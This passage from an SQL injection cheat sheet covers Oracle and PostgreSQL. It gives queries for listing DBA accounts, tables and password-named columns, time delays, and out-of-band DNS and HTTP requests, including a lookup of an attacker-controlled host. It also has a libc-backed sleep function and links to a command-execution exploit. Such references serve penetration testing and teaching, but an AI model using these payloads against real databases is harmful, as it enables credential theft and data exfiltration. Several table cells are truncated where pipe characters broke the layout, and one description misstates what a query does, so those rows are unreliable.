The first query lists current session privileges, the second lists privileges of a specific user, the third finds users with a particular privilege, and the fourth lists roles granted to users. The last three queries require administrative privileges. |
| List DBA Accounts | SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES'; — priv, list DBAs, DBA roles | Lists database administrator accounts in Oracle. This query finds users with administrative privileges and requires administrative privileges itself. |
| Current Database | SELECT global_name FROM global_name;<br>SELECT name FROM v$database;<br>SELECT instance_name FROM v$instance;<br>SELECT SYS.DATABASE_NAME FROM DUAL; | Retrieves the name of the current Oracle database. Each query provides a different way to obtain the current database or instance name. |
| List Databases | SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)<br>— Also query TNS listener for other databases. See http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html (services | status). |
| List Columns | SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';<br>SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo'; | Lists columns in Oracle tables. The first query lists columns of a specified table, and the second query specifies both table and owner. |
| List Tables | SELECT table_name FROM all_tables;<br>SELECT owner, table_name FROM all_tables; | Lists all tables in Oracle. The first query lists table names, and the second includes the owner of each table. |
| Find Tables From Column Name | SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%'; — NB: table names are upper case | Finds Oracle tables that contain a specific column. The query lists tables with a column name like '%PASS%'. Note that Oracle table names are usually in uppercase. |
| Select Nth Row | SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — gets 9th row (rows numbered from 1) | Retrieves the Nth row from a result set in Oracle. This example gets the 9th row from the all_users table. Oracle rows are numbered starting from 1. |
| Select Nth Char | SELECT substr('abcd', 3, 1) FROM dual; — gets 3rd character, ‘c’ | Retrieves the Nth character from a string in Oracle. This example gets the 3rd character from 'abcd'. |
| Bitwise AND | SELECT bitand(6,2) FROM dual; — returns 2<br>SELECT bitand(6,1) FROM dual; — returns 0 | Demonstrates the use of bitwise AND in Oracle. The first query returns 2, and the second returns 0. |

| String Concatenation | SELECT 'A' |  |
| If Statement | BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements | Demonstrates the use of an IF statement in Oracle, using PL/SQL. This example uses dbms_lock.sleep for a conditional time delay. Note that IF statements are typically used in PL/SQL blocks rather than directly in SELECT statements. |
| Case Statement | SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1<br>SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2 | Demonstrates the use of a CASE statement in Oracle SQL. The first query returns 1 if the condition is true (1=1), and the second returns 2 if the condition is false (1=2). |
| Avoiding Quotes | SELECT chr(65) |  |
| Time Delay | BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT<br>SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; — if reverse looks are slow<br>SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual; — if forward lookups are slow<br>SELECT UTL_HTTP.REQUEST('http://google.com/') FROM dual; — if outbound TCP is filtered / slow<br>— Also see http://technet.microsoft.com/en-us/library/cc512676.aspx to create a time delay | Introduces methods to create a time delay in Oracle SQL. The DBMS_LOCK.SLEEP function pauses execution, but it's generally not embeddable in a SELECT statement. Other methods involve slow network operations. |
| Make DNS Requests | SELECT UTL_INADDR.get_host_address('google.com') FROM dual;<br>SELECT UTL_HTTP.REQUEST('http://google.com/') FROM dual; | Demonstrates how to make DNS requests in Oracle SQL. The first query resolves an IP address, and the second makes an HTTP request. |
| Command Execution | http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql | Provides a link to an exploit that can be used to execute commands in Oracle under certain conditions. |
| Local File Access | http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql — can sometimes be used. Check that the following is non-null: SELECT value FROM v$parameter2 WHERE name = 'utl_file_dir';<br>http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql — can be used to read and write files if installed (not available in Oracle Express). | Provides links to exploits that can be used for local file access in Oracle. The first exploit checks the 'utl_file_dir' parameter, and the second exploit can be used to read and write files. |
| Hostname, IP Address | SELECT UTL_INADDR.get_host_name FROM dual;<br>SELECT host_name FROM v$instance;<br>SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address<br>SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; — gets hostnames | Retrieves the hostname and IP address of the Oracle server. The queries use different functions and views to obtain this information. |

| Make DNS Requests | Generally not possible in postgres. However if http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.html is installed (it isn’t by default) it can be used to resolve hostnames (assuming you have DBA rights): SELECT * FROM dblink('host=put.your.hostname.here user=someuser dbname=somedb', 'SELECT version()') RETURNS (result TEXT); Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. “ping pentestmonkey.net”. | Notes that making DNS requests through PostgreSQL is generally not possible. However, the dblink function or OS-level commands (for users with DBA rights) can be used for this purpose. |

| If Statement | IF statements only seem valid inside functions, so aren’t much use for SQL injection. See CASE statement instead. | Notes that IF statements in PostgreSQL are typically used inside PL/pgSQL functions and are not directly applicable for SQL injection. The CASE statement is suggested as an alternative. |
| Case Statement | SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END; -- returns A | Demonstrates the use of a CASE statement in PostgreSQL SQL. This query returns 'A' if the condition is true (1=1). |
| Avoiding Quotes | SELECT CHR(65) |  |
| Time Delay | SELECT pg_sleep(10); -- postgres 8.2+ only<br>CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' language 'C' STRICT; SELECT sleep(10); -- priv, create your own sleep function.
